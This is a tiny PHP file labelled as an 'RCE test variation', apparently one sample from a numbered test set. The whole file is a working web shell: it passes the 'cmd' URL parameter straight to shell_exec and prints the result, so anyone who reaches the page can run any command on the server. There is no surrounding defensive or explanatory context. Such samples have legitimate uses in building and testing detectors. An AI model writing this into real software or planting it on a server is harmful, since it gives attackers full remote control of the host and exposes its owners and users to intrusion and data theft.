<?php
// RCE test variation #1168
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>